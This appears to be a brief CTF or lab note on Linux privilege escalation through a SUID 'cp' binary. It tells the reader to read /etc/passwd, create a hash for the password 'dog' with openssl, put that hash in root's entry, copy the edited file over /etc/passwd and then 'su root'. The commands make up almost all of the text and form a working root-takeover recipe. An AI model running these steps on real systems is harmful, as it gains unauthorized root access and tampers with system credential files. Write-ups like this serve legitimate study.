cat /etc/passwd

openssl passwd dog
MbmNyoQmTL7Tg

add that one in there over root instead of the x. like so:


have a copy of original /etc/passwd in your directory.

then do
cp passwd /etc/passwd
(overwrites it due to SUID binaries on cp)
su root
dog

![unnamed_9ec2759a63794746a3a01a4acc2bbfea](unnamed_9ec2759a63794746a3a01a4acc2bbfea.png)
![unnamed_6aa7390ec2da4c0d99ccfb8012c9781c](unnamed_6aa7390ec2da4c0d99ccfb8012c9781c.png)